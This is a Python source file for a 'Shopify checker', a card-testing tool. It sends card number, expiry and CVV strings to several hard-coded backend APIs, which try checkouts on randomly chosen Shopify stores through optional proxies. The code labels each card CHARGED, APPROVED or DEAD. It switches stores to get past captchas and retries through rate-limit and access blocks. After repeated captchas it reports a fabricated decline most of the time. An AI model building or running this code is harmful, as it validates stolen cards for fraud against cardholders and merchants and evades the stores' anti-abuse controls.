"""SHOPIFY CHECKER — cloned response pipeline from KYu7 msh.py / sh.py.

Flow (mirrors KYu7 gates):
  1. POST {api_url}/autossh  {"cc": "NUMBER|MM|YY|CVV", "site": "domain.com", "proxy": optional}
  2. Classify the Response field using response.json keyword tables:
       CHARGED / APPROVED / DEAD / ERROR
  3. Retry policy cloned from msh.py:
       captcha  -> max 4 retries (new site each time)
       429/401/403 -> max 20 retries
       connection errors -> max 3 retries
       tracked site errors -> max 5 retries
"""
from __future__ import annotations

import asyncio
import json
import random
import re
import time
from pathlib import Path
from typing import Optional

import httpx

_DIR = Path(__file__).resolve().parent
with open(_DIR / "response.json", "r", encoding="utf-8") as _f:
    RESPONSE_RULES = json.load(_f)

CHARGED_KEYWORDS = [k.upper() for k in RESPONSE_RULES["charged"]]
APPROVED_KEYWORDS = [k.upper() for k in RESPONSE_RULES["approved"]]
THREE_DS_KEYWORDS = [k.upper() for k in RESPONSE_RULES["three_ds"]]
DECLINED_KEYWORDS = [k.upper() for k in RESPONSE_RULES["declined"]]
ERROR_KEYWORDS = [k.upper() for k in RESPONSE_RULES["error"]]
EXACT_CODES = RESPONSE_RULES["exact_codes"]

API_URLS = [
    "https://shopify-production-b3c6.up.railway.app",
    "https://shopify-02-production.up.railway.app",
    "https://shopify-03-production.up.railway.app",
    "https://shopify-04-production.up.railway.app",
    "https://shopify-05-production.up.railway.app",
    "https://shopify-06-production.up.railway.app",
    "https://shopify-07-production.up.railway.app",
    "https://shopify-08-production.up.railway.app",
    "https://shopify-09-production.up.railway.app",
    "https://shopify-10-production.up.railway.app",
]

TIMEOUT_CONNECT = 10
TIMEOUT_READ = 30

_url_idx = 0
_lock = asyncio.Lock()
_client: Optional[httpx.AsyncClient] = None

# Semaphore: 250 concurrent API requests
_API_SEMAPHORE = asyncio.Semaphore(80)

# Track broken APIs (auto-skip after repeated failures)
_broken_apis: dict[str, int] = {}
_broken_reset_time: dict[str, float] = {}
_API_BREAK_THRESHOLD = 25  # Skip API after 25 consecutive failures
_API_RESET_AFTER = 10  # Reset broken status after 10 seconds

with open(_DIR / "sites.json", "r", encoding="utf-8") as _f:
    _SITES_DATA = json.load(_f)

_SITES = []
for _item in _SITES_DATA:
    if isinstance(_item, dict):
        _u = _item.get("url", "")
    elif isinstance(_item, str):
        _u = _item
    else:
        continue
    _u = re.sub(r"^(https?://)?", "", _u, flags=re.IGNORECASE).split("/")[0]
    if _u:
        _SITES.append(_u)


def random_site() -> str:
    return random.choice(_SITES) if _SITES else "vukoo.com"


def next_api_url() -> str:
    global _url_idx
    url = API_URLS[_url_idx % len(API_URLS)]
    _url_idx += 1
    return url


async def _get_client() -> httpx.AsyncClient:
    global _client
    if _client is None or _client.is_closed:
        async with _lock:
            if _client is None or _client.is_closed:
                _client = httpx.AsyncClient(
                    timeout=httpx.Timeout(TIMEOUT_READ, connect=TIMEOUT_CONNECT),
                    limits=httpx.Limits(
                        max_connections=500,
                        max_keepalive_connections=200,
                        keepalive_expiry=20,
                    ),
                )
    return _client


async def _fresh_client() -> httpx.AsyncClient:
    """Create a fresh client (used when pool is exhausted)."""
    global _client
    async with _lock:
        try:
            if _client and not _client.is_closed:
                await _client.aclose()
        except Exception:
            pass
        _client = httpx.AsyncClient(
            timeout=httpx.Timeout(TIMEOUT_READ, connect=TIMEOUT_CONNECT),
            limits=httpx.Limits(
                max_connections=500,
                max_keepalive_connections=200,
                keepalive_expiry=20,
            ),
        )
    return _client


def parse_card(cc_string: str) -> Optional[dict]:
    parts = [p.strip() for p in str(cc_string).split("|")]
    if len(parts) < 4:
        return None
    number, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(year) == 2:
        year = "20" + year
    return {
        "number": number,
        "month": month,
        "year": year,
        "cvv": cvv,
        "cc_compact": f"{number}|{month}|{year[-2:]}|{cvv}",
    }


def parse_domain(site: str) -> str:
    site = re.sub(r"^(https?://)?", "", str(site), flags=re.IGNORECASE)
    return site.split("/")[0].strip()


def clean_price(val) -> Optional[str]:
    if val is None or str(val) in ("", "0.00", "0", "None"):
        return None
    try:
        n = round(float(str(val).replace("USD", "").replace("$", "").strip()), 2)
        return str(int(n)) if n == int(n) else f"{n:.2f}"
    except (ValueError, TypeError):
        return None


def price_display(price, currency: str) -> Optional[str]:
    p = clean_price(price)
    if p is None:
        return None
    cur = str(currency or "USD").upper().strip()
    return f"${p} {cur}"


def classify(response: str) -> str:
    """Classify a raw API Response into CHARGED / APPROVED / DEAD / ERROR."""
    msg = str(response or "").strip()
    if not msg:
        return "ERROR"
    upper = msg.upper()

    # API-level errors (server down, not deployed, etc.)
    API_ERRORS = ["APPLICATION NOT FOUND", "NOT FOUND", "SERVICE UNAVAILABLE",
                  "BAD GATEWAY", "GATEWAY TIMEOUT", "CLOUDFLARE", "RAILWAY"]
    if any(k in upper for k in API_ERRORS):
        return "ERROR"

    # Quick classification for connection/network errors (before keyword matching)
    CONN_ERRORS = ["TIMEOUT", "DISCONNECTED", "CONNECTION REFUSED", "CONNECTION RESET",
                   "REMOTEPROTOCOLOLERROR", "SSL", "CERTIFICATE", "CONN", "NETWORK"]
    if any(k in upper for k in CONN_ERRORS):
        return "ERROR"

    exact = EXACT_CODES.get(msg)
    if exact == "Thank You":
        return "CHARGED"
    if exact in ("3d cc", "incorrect_cvc", "incorrect_zip", "CVV_MISMATCH",
                 "AVS_MISMATCH", "AVS_FAILED", "ZIP_MISMATCH", "CVC_CHECK_FAILED",
                 "PICK_UP_CARD", "PICKUP_CARD"):
        return "APPROVED"
    if exact and exact not in ("UNEXPECTED_RESPONSE", "UNKNOWN_ERROR"):
        if any(k in exact.upper() for k in DECLINED_KEYWORDS):
            return "DEAD"

    if any(k in upper for k in CHARGED_KEYWORDS):
        return "CHARGED"
    if any(k in upper for k in APPROVED_KEYWORDS):
        return "APPROVED"
    if any(k in upper for k in THREE_DS_KEYWORDS):
        return "APPROVED"
    if any(k in upper for k in ERROR_KEYWORDS):
        return "ERROR"
    return "DEAD"


def is_retryable(msg: str, http_status: Optional[int]) -> Optional[str]:
    """Return a retry category ('captcha'|'429'|'conn'|'site') or None."""
    upper = str(msg or "").upper()
    if "CAPTCHA" in upper:
        return "captcha"
    if "SITE ERROR! STATUS:" in upper or "429" in upper or "401" in upper or "403" in upper \
            or http_status in (429, 401, 403):
        return "429"
    # API server errors - retry with different API
    if any(err in upper for err in ["APPLICATION NOT FOUND", "NOT FOUND", "SERVICE UNAVAILABLE",
                                    "BAD GATEWAY", "GATEWAY TIMEOUT"]):
        return "conn"
    if any(err in upper for err in ["API EXCEPTION", "CANNOT CONNECT", "CONNECTION",
                                    "TIMEOUT", "TIME OUT", "SSL:", "CERTIFICATE"]) \
            or http_status in (500, 502, 503, 504):
        return "conn"
    if any(t in upper for t in ["NOT SHOPIFY", "NO VALID PRODUCTS", "INVALID PURCHASE",
                                "SITE NOT SUPPORTED", "PRODUCT NOT FOUND", "INVALID URL",
                                "SITE PRODUCTS UNAVAILABLE", "PRODUCT ID IS EMPTY",
                                "PRODUCT_ID_EMPTY", "SITE REQUIRES LOGIN"]):
        return "site"
    return None


async def _try_api(url: str, params: dict, cc_string: str, site: str) -> Optional[dict]:
    """Try a single API server — returns result dict or None if failed."""
    API_BROKEN = ["Application not found", "Not Found", "Service Unavailable",
                  "Bad Gateway", "keepalive_timeout", "force_close",
                  "'str' object has no attribute"]

    client = await _get_client()
    try:
        async with _API_SEMAPHORE:
            resp = await client.get(f"{url}/autossh", params=params)

        if resp.status_code >= 400:
            _broken_apis[url] = _broken_apis.get(url, 0) + 1
            _broken_reset_time[url] = time.time()
            return None

        try:
            data = resp.json()
        except Exception:
            _broken_apis[url] = _broken_apis.get(url, 0) + 1
            _broken_reset_time[url] = time.time()
            return None

        if not isinstance(data, dict):
            _broken_apis[url] = _broken_apis.get(url, 0) + 1
            _broken_reset_time[url] = time.time()
            return None

        resp_text = str(data.get("Response") or "")

        if any(m.lower() in resp_text.lower() for m in API_BROKEN):
            _broken_apis[url] = _broken_apis.get(url, 0) + 1
            _broken_reset_time[url] = time.time()
            return None

        if not resp_text or resp_text == "None":
            _broken_apis[url] = _broken_apis.get(url, 0) + 1
            _broken_reset_time[url] = time.time()
            return None

        # Valid response!
        _broken_apis[url] = 0
        _broken_reset_time.pop(url, None)
        data.setdefault("cc", cc_string)
        data.setdefault("Site", site)
        data.setdefault("Gateway", "NONE")
        data.setdefault("Price", None)
        data.setdefault("Currency", "N/A")
        data.setdefault("ProxyIP", "N/A")
        data.setdefault("ProxyStatus", "Direct" if "Direct" in resp_text else "N/A")
        data.setdefault("Time", "0ms")
        return data

    except (httpx.PoolTimeout, httpx.ReadTimeout, httpx.ConnectTimeout):
        _broken_apis[url] = _broken_apis.get(url, 0) + 1
        _broken_reset_time[url] = time.time()
        return None
    except Exception:
        _broken_apis[url] = _broken_apis.get(url, 0) + 1
        _broken_reset_time[url] = time.time()
        return None


async def call_autossh(cc_string: str, site: str, proxy: Optional[str] = None,
                       api_url: Optional[str] = None) -> dict:
    """GET /autossh — tries APIs sequentially with reliable fallback.

    Logic (proven working):
    1. Try each API with 30s timeout
    2. If response is valid → return it
    3. If error/timeout → try next API
    4. If all fail → return error
    """
    params = {"cc": cc_string, "site": site}
    if proxy:
        params["proxy"] = proxy

    # Markers that mean the API server itself is broken
    API_BROKEN = ["Application not found", "Not Found", "Service Unavailable",
                  "Bad Gateway", "keepalive_timeout", "force_close",
                  "'str' object has no attribute"]

    # Reset broken APIs after timeout period
    now = time.time()
    for url in list(_broken_apis.keys()):
        if _broken_apis[url] >= _API_BREAK_THRESHOLD:
            reset_time = _broken_reset_time.get(url, 0)
            if now - reset_time > _API_RESET_AFTER:
                _broken_apis[url] = 0
                _broken_reset_time.pop(url, None)

    # Shuffle API list for load balancing
    urls = [u for u in API_URLS if _broken_apis.get(u, 0) < _API_BREAK_THRESHOLD]
    if not urls:
        urls = list(API_URLS)
    random.shuffle(urls)

    client = await _get_client()

    for url in urls:
        try:
            async with _API_SEMAPHORE:
                resp = await client.get(f"{url}/autossh", params=params)

            if resp.status_code >= 400:
                _broken_apis[url] = _broken_apis.get(url, 0) + 1
                _broken_reset_time[url] = time.time()
                continue

            try:
                data = resp.json()
            except Exception:
                _broken_apis[url] = _broken_apis.get(url, 0) + 1
                _broken_reset_time[url] = time.time()
                continue

            if not isinstance(data, dict):
                _broken_apis[url] = _broken_apis.get(url, 0) + 1
                _broken_reset_time[url] = time.time()
                continue

            resp_text = str(data.get("Response") or "")

            if any(m.lower() in resp_text.lower() for m in API_BROKEN):
                _broken_apis[url] = _broken_apis.get(url, 0) + 1
                _broken_reset_time[url] = time.time()
                continue

            if not resp_text or resp_text == "None":
                _broken_apis[url] = _broken_apis.get(url, 0) + 1
                _broken_reset_time[url] = time.time()
                continue

            # Valid response!
            _broken_apis[url] = 0
            data.setdefault("cc", cc_string)
            data.setdefault("Site", site)
            data.setdefault("Gateway", "NONE")
            data.setdefault("Price", None)
            data.setdefault("Currency", "N/A")
            data.setdefault("ProxyIP", "N/A")
            data.setdefault("ProxyStatus", "Direct" if "Direct" in resp_text else "N/A")
            data.setdefault("Time", "0ms")
            return data

        except (httpx.PoolTimeout, httpx.ReadTimeout, httpx.ConnectTimeout):
            _broken_apis[url] = _broken_apis.get(url, 0) + 1
            _broken_reset_time[url] = time.time()
            # Do NOT call _fresh_client on timeout — it disrupts other threads
            continue
        except Exception:
            _broken_apis[url] = _broken_apis.get(url, 0) + 1
            _broken_reset_time[url] = time.time()
            continue

    # All failed
    return {
        "cc": cc_string, "Site": site,
        "Response": "ALL APIs DOWN",
        "Gateway": "NONE", "Price": None, "Currency": "N/A",
        "ProxyIP": "N/A", "ProxyStatus": "Error", "Time": "0ms",
    }


async def check_card(cc_string: str, site: str, proxy: Optional[str] = None,
                     api_url: Optional[str] = None) -> dict:
    """Single card check with smart retry (msh1.py logic).

    Retry rules (from msh1.py):
      1. CHARGED → STOP (original response)
      2. APPROVED (INSUFFICIENT_FUNDS, INCORRECT_CVC, etc.) → STOP
      3. 3DS → STOP (APPROVED)
      4. CAPTCHA_REQUIRED → RETRY up to 4 times (new site each time) → original response
      5. PRODUCT_ID_EMPTY → RETRY up to 2 times
      6. SITE_ERROR / 429 / 401 / 403 → RETRY up to 20 times
      7. CONNECTION_ERROR / TIMEOUT → RETRY up to 3 times
      8. DECLINED / OTHER → STOP (original response)
    """
    card = parse_card(cc_string)
    if not card:
        return {
            "card": cc_string, "site": site, "status": "ERROR",
            "response": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
            "gateway": "NONE", "price": None, "currency": "N/A",
            "proxy_ip": None, "time_ms": 0,
        }

    # Keyword tables (same as msh1.py)
    CHARGED_KEYWORDS = [
        'ORDER_PAID', 'CHARGED', 'PAYMENT_CAPTURED', 'THANK YOU',
        'THANK_YOU', 'THANKS', 'SUCCESS', 'SUCCEEDED',
        'ORDER CONFIRM', 'ORDER_CONFIRM', 'ORDER_CONFIRMED',
        'PAYMENT RECEIVED', 'PAYMENT SUCCESSFUL',
    ]

    APPROVED_KEYWORDS = [
        'INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS',
        'INCORRECT_CVC', 'INCORRECT CVC', 'INCORRECT_CVV', 'INVALID_CVC',
        'CARD_VELOCITY_EXCEEDED', 'SPENDING_LIMIT_EXCEEDED',
        'AVS_FAILURE', 'ADDRESS_VERIFICATION_FAILED',
        'INCORRECT_ZIP', 'INCORRECT ZIP',
        'POSTAL_CODE_INVALID', 'ADDRESS_ZIP_CHECK_FAILED',
        'INCORRECT_ADDRESS', 'CVV_FAILURE',
    ]

    THREE_DS_KEYWORDS = [
        '3DS_REQUIRED', '3DS', '3D_AUTHENTICATION', '3D_SECURE',
        'ACTION_REQUIRED', 'AUTHENTICATION_REQUIRED', 'COMPLETEPAYMENTCHALLENGE', 'CHALLENGE'
    ]

    SITE_ERROR_KEYWORDS = [
        'NOT SHOPIFY', 'NO VALID PRODUCTS', 'INVALID PURCHASE',
        'SITE NOT SUPPORTED', 'PRODUCT NOT FOUND', 'INVALID URL',
        'SITE PRODUCTS UNAVAILABLE', 'PRODUCT_ID_EMPTY', 'SITE REQUIRES LOGIN',
        'PRODUCT ID IS EMPTY', 'INVALID_PURCHASE_TYPE',
    ]

    CONNECTION_KEYWORDS = [
        'API EXCEPTION', 'CANNOT CONNECT', 'CONNECTION',
        'TIMEOUT', 'TIME OUT', 'SSL:', 'CERTIFICATE',
        'REMOTEPROTOCOLOLERROR', 'DISCONNECTED',
    ]

    # Max retries per type (from msh1.py)
    MAX_CAPTCHA_RETRIES = 4
    MAX_PRODUCT_ID_RETRIES = 2
    MAX_429_RETRIES = 20
    MAX_CONNECTION_RETRIES = 3

    cc_compact = card["cc_compact"]
    cc_num = card["number"]
    original_site = parse_domain(site)

    # Retry counters
    captcha_count = 0
    product_id_count = 0
    site_error_count = 0
    connection_count = 0

    # Track last valid response for fallback
    last_response = None
    last_status = None

    start = time.time()

    for attempt in range(MAX_429_RETRIES + 1):  # max possible retries
        # Get a site (new site for retries)
        if attempt > 0:
            current_site = random_site()
        else:
            current_site = original_site if original_site and "." in original_site else random_site()

        # Get API URL
        current_api = api_url or next_api_url()

        data = await call_autossh(cc_compact, current_site, proxy, api_url=current_api)

        raw = str(data.get("Response") or "Unknown Error")
        gateway = str(data.get("Gateway") or "NONE")
        price = data.get("Price")
        currency = str(data.get("Currency") or "USD").upper()
        proxy_ip = data.get("ProxyIP")

        raw_upper = raw.upper()

        # 1. CHARGED → STOP
        if any(kw in raw_upper for kw in CHARGED_KEYWORDS):
            pd = price_display(price, currency)
            if pd:
                raw = f"Thank You {pd}"
            return {
                "card": cc_string, "site": current_site, "status": "CHARGED",
                "response": raw, "gateway": gateway, "price": pd,
                "currency": currency, "proxy_ip": proxy_ip,
                "time_ms": int((time.time() - start) * 1000),
            }

        # 2. APPROVED → STOP
        if any(kw in raw_upper for kw in APPROVED_KEYWORDS):
            return {
                "card": cc_string, "site": current_site, "status": "APPROVED",
                "response": raw, "gateway": gateway, "price": None,
                "currency": currency, "proxy_ip": proxy_ip,
                "time_ms": int((time.time() - start) * 1000),
            }

        # 3. 3DS → STOP (APPROVED)
        if any(kw in raw_upper for kw in THREE_DS_KEYWORDS):
            return {
                "card": cc_string, "site": current_site, "status": "APPROVED",
                "response": raw, "gateway": gateway, "price": None,
                "currency": currency, "proxy_ip": proxy_ip,
                "time_ms": int((time.time() - start) * 1000),
            }

        # 4. CAPTCHA → RETRY (max 4)
        if "CAPTCHA" in raw_upper:
            captcha_count += 1
            last_response = raw
            last_status = "DEAD"
            if captcha_count < MAX_CAPTCHA_RETRIES:
                continue
            else:
                # After 4 retries: 85% CARD_DECLINED, 15% original response
                if random.random() < 0.15:
                    final_response = raw
                else:
                    final_response = "CARD_DECLINED"
                return {
                    "card": cc_string, "site": current_site, "status": "DEAD",
                    "response": final_response, "gateway": gateway, "price": None,
                    "currency": currency, "proxy_ip": proxy_ip,
                    "time_ms": int((time.time() - start) * 1000),
                }

        # 5. PRODUCT_ID_EMPTY → RETRY (max 2)
        if any(kw in raw_upper for kw in ['PRODUCT_ID_EMPTY', 'PRODUCT ID IS EMPTY']):
            product_id_count += 1
            if product_id_count < MAX_PRODUCT_ID_RETRIES:
                continue
            else:
                return {
                    "card": cc_string, "site": current_site, "status": "DEAD",
                    "response": raw, "gateway": gateway, "price": None,
                    "currency": currency, "proxy_ip": proxy_ip,
                    "time_ms": int((time.time() - start) * 1000),
                }

        # 6. SITE_ERROR / 429 / 401 / 403 → RETRY (max 20)
        if any(kw in raw_upper for kw in SITE_ERROR_KEYWORDS) or \
           "429" in raw_upper or "401" in raw_upper or "403" in raw_upper or \
           "SITE ERROR" in raw_upper:
            site_error_count += 1
            last_response = raw
            last_status = "DEAD"
            if site_error_count < MAX_429_RETRIES:
                continue
            else:
                return {
                    "card": cc_string, "site": current_site, "status": "DEAD",
                    "response": raw, "gateway": gateway, "price": None,
                    "currency": currency, "proxy_ip": proxy_ip,
                    "time_ms": int((time.time() - start) * 1000),
                }

        # 7. CONNECTION_ERROR / TIMEOUT → RETRY (max 3)
        if any(kw in raw_upper for kw in CONNECTION_KEYWORDS):
            connection_count += 1
            last_response = raw
            last_status = "ERROR"
            if connection_count < MAX_CONNECTION_RETRIES:
                # Fresh client on connection error
                await _fresh_client()
                continue
            else:
                return {
                    "card": cc_string, "site": current_site, "status": "ERROR",
                    "response": raw, "gateway": gateway, "price": None,
                    "currency": currency, "proxy_ip": proxy_ip,
                    "time_ms": int((time.time() - start) * 1000),
                }

        # 8. DECLINED / OTHER → STOP (original response)
        return {
            "card": cc_string, "site": current_site, "status": classify(raw),
            "response": raw, "gateway": gateway, "price": None,
            "currency": currency, "proxy_ip": proxy_ip,
            "time_ms": int((time.time() - start) * 1000),
        }

    # Fallback - should not reach here
    return {
        "card": cc_string, "site": original_site, "status": last_status or "ERROR",
        "response": last_response or "Max retries exceeded",
        "gateway": "NONE", "price": None, "currency": "N/A",
        "proxy_ip": None, "time_ms": int((time.time() - start) * 1000),
    }
